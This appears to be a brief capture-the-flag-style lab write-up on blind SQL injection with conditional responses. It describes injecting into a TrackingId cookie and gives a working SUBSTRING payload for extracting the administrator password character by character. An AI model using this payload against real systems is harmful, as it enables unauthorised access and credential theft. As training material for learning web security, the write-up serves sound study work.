# Lab 11: Blind SQL Injection with Conditional Responses

* **Solution**: Inject a conditional query into the TrackingId cookie to check if “Welcome back” appears, then brute-force the admin password character-by-character.
* **Final Payloads**:
  * TrackingId=xyz' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a (repeat for each position, a-z, 0-9)